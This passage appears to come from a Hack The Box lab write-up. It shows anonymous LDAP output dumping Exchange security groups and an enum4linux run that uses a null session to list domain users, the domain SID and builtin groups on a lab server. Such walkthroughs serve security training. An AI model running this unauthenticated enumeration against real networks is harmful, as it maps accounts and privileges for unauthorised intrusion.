 change.
distinguishedName: CN=Hygiene Management,OU=Microsoft Exchange Security Groups
 ,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21554
uSNChanged: 21597
garbageCollPeriod: 1209600
name: Hygiene Management
objectGUID:: Xt8xqOjGSUeNRq/o3sCETQ==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPWgQAAA==
sAMAccountName: Hygiene Management
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=View-Only Recipients-Hygiene Management,CN=Role Assignments,C
 N=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configurati
 on,DC=htb,DC=local
msExchUserBL: CN=View-Only Configuration-Hygiene Management,CN=Role Assignment
 s,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configur
 ation,DC=htb,DC=local
msExchUserBL: CN=Transport Hygiene-Hygiene Management,CN=Role Assignments,CN=R
 BAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,
 DC=htb,DC=local
msExchUserBL: CN=Transport Agents-Hygiene Management,CN=Role Assignments,CN=RB
 AC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchUserBL: CN=Receive Connectors-Hygiene Management,CN=Role Assignments,CN=
 RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration
 ,DC=htb,DC=local
msExchUserBL: CN=ApplicationImpersonation-Hygiene Management,CN=Role Assignmen
 ts,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configu
 ration,DC=htb,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 11
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Compliance Management, Microsoft Exchange Security Groups, htb.local
dn: CN=Compliance Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=l
 ocal
objectClass: top
objectClass: group
cn: Compliance Management
description: This role group will allow a specified user, responsible for comp
 liance, to properly configure and manage compliance settings within Exchange 
 in accordance with their policy.
distinguishedName: CN=Compliance Management,OU=Microsoft Exchange Security Gro
 ups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21559
uSNChanged: 21599
garbageCollPeriod: 1209600
name: Compliance Management
objectGUID:: A0s1P8CPr0+KKzDulybkZw==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPWwQAAA==
sAMAccountName: Compliance Management
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=View-Only Recipients-Compliance Management,CN=Role Assignment
 s,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configur
 ation,DC=htb,DC=local
msExchUserBL: CN=View-Only Configuration-Compliance Management,CN=Role Assignm
 ents,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Confi
 guration,DC=htb,DC=local
msExchUserBL: CN=View-Only Audit Logs-Compliance Management,CN=Role Assignment
 s,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configur
 ation,DC=htb,DC=local
msExchUserBL: CN=Transport Rules-Compliance Management,CN=Role Assignments,CN=
 RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration
 ,DC=htb,DC=local
msExchUserBL: CN=Retention Management-Compliance Management,CN=Role Assignment
 s,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configur
 ation,DC=htb,DC=local
msExchUserBL: CN=Message Tracking-Compliance Management,CN=Role Assignments,CN
 =RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuratio
 n,DC=htb,DC=local
msExchUserBL: CN=Journaling-Compliance Management,CN=Role Assignments,CN=RBAC,
 CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=h
 tb,DC=local
msExchUserBL: CN=Information Rights Management-Compliance Management,CN=Role A
 ssignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
msExchUserBL: CN=Data Loss Prevention-Compliance Management,CN=Role Assignment
 s,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configur
 ation,DC=htb,DC=local
msExchUserBL: CN=Compliance Admin-Compliance Management,CN=Role Assignments,CN
 =RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuratio
 n,DC=htb,DC=local
msExchUserBL: CN=Audit Logs-Compliance Management,CN=Role Assignments,CN=RBAC,
 CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=h
 tb,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 26
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Security Reader, Microsoft Exchange Security Groups, htb.local
dn: CN=Security Reader,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Security Reader
description: Membership in this role group is synchronized across services and
  managed centrally. This role group is not manageable through the administrat
 or portals. Members of this role group may include cross-service administrato
 rs, as well as external partner groups and Microsoft Support. By default, thi
 s group may not be assigned any roles. However, it will be a member of the Se
 curity Reader role groups and will inherit the capabilities of that role grou
 p.
distinguishedName: CN=Security Reader,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21564
uSNChanged: 21601
garbageCollPeriod: 1209600
name: Security Reader
objectGUID:: wqDjVv6G+Uy9zg9wQxjbVQ==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPXAQAAA==
sAMAccountName: Security Reader
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=Security Reader-Security Reader,CN=Role Assignments,CN=RBAC,C
 N=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=ht
 b,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 84
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Security Administrator, Microsoft Exchange Security Groups, htb.local
dn: CN=Security Administrator,OU=Microsoft Exchange Security Groups,DC=htb,DC=
 local
objectClass: top
objectClass: group
cn: Security Administrator
description: Membership in this role group is synchronized across services and
  managed centrally. This role group is not manageable through the administrat
 or portals. Members of this role group may include cross-service administrato
 rs, as well as external partner groups and Microsoft Support. By default, thi
 s group may not be assigned any roles. However, it will be a member of the Se
 curity Administrators role groups and will inherit the capabilities of that r
 ole group.
distinguishedName: CN=Security Administrator,OU=Microsoft Exchange Security Gr
 oups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21569
uSNChanged: 21603
garbageCollPeriod: 1209600
name: Security Administrator
objectGUID:: klxj80zg9EmTbS/Pjp/57w==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPXQQAAA==
sAMAccountName: Security Administrator
sAMAccountType: 268435456
managedBy: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchUserBL: CN=Security Admin-Security Administrator,CN=Role Assignments,CN=
 RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration
 ,DC=htb,DC=local
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 85
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 1073741824
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Exchange Servers, Microsoft Exchange Security Groups, htb.local
dn: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Exchange Servers
description: This group contains all the Exchange servers. This group shouldn'
 t be deleted.
member: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Object
 s,DC=htb,DC=local
member: CN=EXCH01,CN=Computers,DC=htb,DC=local
distinguishedName: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,D
 C=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919113731.0Z
uSNCreated: 21605
memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Group
 s,DC=htb,DC=local
memberOf: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=local
uSNChanged: 24508
garbageCollPeriod: 1209600
name: Exchange Servers
objectGUID:: VT//wzQ6506RMP4zW5D4VA==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPXgQAAA==
sAMAccountName: Exchange Servers
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 0
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Exchange Trusted Subsystem, Microsoft Exchange Security Groups, htb.local
dn: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb
 ,DC=local
objectClass: top
objectClass: group
cn: Exchange Trusted Subsystem
description: This group contains Exchange servers that run Exchange cmdlets on
  behalf of users via the management service. Its members have permission to r
 ead and modify all Exchange configuration, as well as user accounts and group
 s. This group should not be deleted.
member: CN=EXCH01,CN=Computers,DC=htb,DC=local
distinguishedName: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Securit
 y Groups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919113731.0Z
uSNCreated: 21610
memberOf: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Group
 s,DC=htb,DC=local
uSNChanged: 24511
garbageCollPeriod: 1209600
name: Exchange Trusted Subsystem
objectGUID:: XLQnuppmkEa9/O4DReF1IQ==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPXwQAAA==
sAMAccountName: Exchange Trusted Subsystem
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 0
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Managed Availability Servers, Microsoft Exchange Security Groups, htb.local
dn: CN=Managed Availability Servers,OU=Microsoft Exchange Security Groups,DC=h
 tb,DC=local
objectClass: top
objectClass: group
cn: Managed Availability Servers
description: This group contains all the Managed Availability servers. This gr
 oup shouldn't be deleted.
member: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=lo
 cal
member: CN=EXCH01,CN=Computers,DC=htb,DC=local
distinguishedName: CN=Managed Availability Servers,OU=Microsoft Exchange Secur
 ity Groups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919113731.0Z
uSNCreated: 21615
uSNChanged: 24500
garbageCollPeriod: 1209600
name: Managed Availability Servers
objectGUID:: mvC1zTcFUEGu84KDURh17Q==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPYAQAAA==
sAMAccountName: Managed Availability Servers
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 0
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# Exchange Windows Permissions, Microsoft Exchange Security Groups, htb.local
dn: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=h
 tb,DC=local
objectClass: top
objectClass: group
cn: Exchange Windows Permissions
description: This group contains Exchange servers that run Exchange cmdlets on
  behalf of users via the management service. Its members have permission to r
 ead and modify all Windows accounts and groups. This group should not be dele
 ted.
member: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC
 =htb,DC=local
distinguishedName: CN=Exchange Windows Permissions,OU=Microsoft Exchange Secur
 ity Groups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21620
uSNChanged: 21634
garbageCollPeriod: 1209600
name: Exchange Windows Permissions
objectGUID:: DczwZB2OBkWYvibGfcW+0w==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPYQQAAA==
sAMAccountName: Exchange Windows Permissions
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 0
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# ExchangeLegacyInterop, Microsoft Exchange Security Groups, htb.local
dn: CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=htb,DC=l
 ocal
objectClass: top
objectClass: group
cn: ExchangeLegacyInterop
description: This group is for interoperability with Exchange 2003 servers wit
 hin the same forest. This group should not be deleted.
distinguishedName: CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Gro
 ups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111114.0Z
whenChanged: 20190919111114.0Z
uSNCreated: 21625
uSNChanged: 21640
garbageCollPeriod: 1209600
name: ExchangeLegacyInterop
objectGUID:: 7pcj4xo4NkKt9LwG06M1Fg==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPYgQAAA==
sAMAccountName: ExchangeLegacyInterop
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124642.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchGroupJoinRestriction: 0
msExchProvisioningFlags: 0
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
msExchRoleGroupType: 0
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchLocalizationFlags: 0
msExchModerationFlags: 6
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchGroupDepartRestriction: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1

# search reference
ref: ldap://ForestDnsZones.htb.local/DC=ForestDnsZones,DC=htb,DC=local

# search reference
ref: ldap://DomainDnsZones.htb.local/DC=DomainDnsZones,DC=htb,DC=local

# search reference
ref: ldap://htb.local/CN=Configuration,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 316
# numEntries: 312
# numReferences: 3
```
Also run enum4linux:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-kk6zubslxy]─[~/enum4linux]
└──╼ [★]$ perl enum4linux.pl -a 10.129.1.77
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec 29 13:03:23 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.129.1.77
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 10.129.1.77    |
 =================================================== 
[E] Can't find workgroup/domain


 =========================================== 
|    Nbtstat Information for 10.129.1.77    |
 =========================================== 
Looking up status of 10.129.1.77
No reply from 10.129.1.77

 ==================================== 
|    Session Check on 10.129.1.77    |
 ==================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 437.
[+] Server 10.129.1.77 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ========================================== 
|    Getting domain SID for 10.129.1.77    |
 ========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 359.
Domain Name: HTB
Domain Sid: S-1-5-21-3072663084-364016917-1341370565
[+] Host is part of a domain (not a workgroup)

 ===================================== 
|    OS information on 10.129.1.77    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at enum4linux.pl line 464.
[+] Got OS info for 10.129.1.77 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 467.
[+] Got OS info for 10.129.1.77 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================ 
|    Users on 10.129.1.77    |
 ============================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 866.
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}	Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 883.
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

 ======================================== 
|    Share Enumeration on 10.129.1.77    |
 ======================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 640.

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.129.1.77

 =================================================== 
|    Password Policy Information for 10.129.1.77    |
 =================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 ============================= 
|    Groups on 10.129.1.77    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 542.

[+] Getting builtin groups:
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
